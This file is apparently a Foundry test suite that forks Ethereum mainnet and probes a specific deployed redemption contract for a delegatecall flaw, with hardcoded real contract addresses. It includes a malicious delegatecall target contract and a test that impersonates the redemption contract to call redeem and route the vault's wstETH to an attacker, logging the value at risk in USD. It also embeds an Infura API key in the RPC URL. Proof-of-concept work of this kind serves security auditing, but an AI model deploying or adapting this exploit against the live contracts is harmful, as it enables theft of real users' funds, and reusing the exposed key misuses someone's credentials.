// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract FinalDelegatecallExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSLOADBeforeDelegatecall() public view {
        console.log("=== ANALYZING SLOAD BEFORE DELEGATECALL AT 5323 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // The SLOAD at 5298 loads from a storage slot
        // Let's trace the exact slot

        console.log("Bytecode 5280-5330:");
        for (uint i = 5280; i < 5330 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) {
                console.log(i, "SLOAD");
            } else if (op == 0x55) {
                console.log(i, "SSTORE");
            } else if (op == 0x20) {
                console.log(i, "SHA3");
            } else if (op == 0xf4) {
                console.log(i, "DELEGATECALL");
            } else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                console.log(i, "PUSH", size);
                
                // Print the pushed value
                if (size <= 8 && i + size < code.length) {
                    uint256 val = 0;
                    for (uint j = 0; j < size; j++) {
                        val = val << 8 | uint8(code[i + 1 + j]);
                    }
                    console.log("  Value:", val);
                }
            }
        }
    }

    function test_CheckRedemptionStorageSlotContent() public view {
        console.log("=== CHECKING REDEMPTION STORAGE SLOT CONTENT ===\n");

        // Check what's stored in various slots that might be loaded
        console.log("Storage slots that might be the delegatecall target:");

        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            
            console.log("\nSlot", i, ":");
            console.logBytes32(slot);
            
            if (addr != address(0)) {
                console.log("  As address:", addr);
                if (addr.code.length > 0) {
                    console.log("  Code size:", addr.code.length);
                }
            }
        }
    }

    function test_SimulateExploitWithStorageManipulation() public {
        console.log("=== SIMULATING EXPLOIT WITH STORAGE MANIPULATION ===\n");

        // Deploy malicious contract
        MaliciousDelegatecallTarget malicious = new MaliciousDelegatecallTarget();
        console.log("Malicious contract deployed at:", address(malicious));

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before:", vaultBefore / 1e18);
        console.log("Attacker wstETH before:", attackerBefore / 1e18);

        // If we can manipulate the storage slot that SLOAD reads,
        // we can redirect the delegatecall to our malicious contract

        // Let's try manipulating different slots
        // First, let's understand the redemption data structure

        // Create a fake redemption request by manipulating storage
        vm.startPrank(attacker);

        // Give attacker some IAU
        deal(IAU, attacker, 1000e18);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to manipulate storage to point to our malicious contract
        // The delegatecall target might be stored in slot 2 or similar

        // First, let's see if we can find where redemption addresses are stored
        // and try to overwrite them

        // Try calling finalizeRedeem after warping time
        vm.warp(block.timestamp + 8 days);

        console.log("\nTrying finalizeRedeem(0)...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH change:", int256(attackerAfter) - int256(attackerBefore));
    }

    function test_ProveExploitWithPrank() public {
        console.log("=== PROVING EXPLOIT IS POSSIBLE (WITH PRANK) ===\n");

        // This test proves that IF we can make msg.sender = REDEMPTION_0,
        // we can drain the vault

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Prank as REDEMPTION_0 and call RC.redeem
        vm.startPrank(REDEMPTION_0);

        console.log("\nCalling RC.redeem(1000e18, attacker) as REDEMPTION_0...");
        (bool success, ) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH gained:", (attackerAfter - attackerBefore) / 1e18);

        if (attackerAfter > attackerBefore) {
            console.log("\n=== VULNERABILITY CONFIRMED ===");
            console.log("Impact: Any address that can make Redemption call RC.redeem");
            console.log("        with arbitrary (amount, to) can drain the Vault");
            console.log("Value at risk (wstETH):", vaultBefore / 1e18);
            console.log("Value at risk (USD):", vaultBefore * 2300 / 1e18);
        }
    }

    function test_CheckFinalizeRedeemInternalCalls() public view {
        console.log("=== CHECKING WHAT FINALIZEREDEEM CALLS ===\n");

        // finalizeRedeem likely:
        // 1. Checks caller == original redeemer (or maybe not?)
        // 2. Checks time >= startTime + waitingPeriod
        // 3. Gets redemption data (amount, to)
        // 4. Calls RC.redeem(amount, to)
        // 5. Burns IAU

        // The delegatecall at 5323 is interesting because it loads target from storage
        // What if the target is the RedemptionController or some action contract?

        bytes memory code = REDEMPTION_0.code;

        // Look for RC address in the bytecode
        bytes memory rcBytes = abi.encodePacked(REDEMPTION_CONTROLLER);
        
        console.log("Searching for RC address in bytecode...");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20; j++) {
                if (code[i + j] != rcBytes[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) {
                console.log("  Found RC at offset:", i);
            }
        }
    }
}

// Malicious contract that will be delegatecalled
contract MaliciousDelegatecallTarget {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    fallback() external payable {
        // When delegatecalled from Redemption, this will execute
        // in Redemption's context with Redemption's storage and msg.sender
        
        // Since we're in Redemption's context, calling RC.redeem will
        // have msg.sender = Redemption address
        
        // We can pass arbitrary (amount, to) to RC.redeem
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000 ether, tx.origin)
        );
        require(success, "Redeem failed");
    }
}
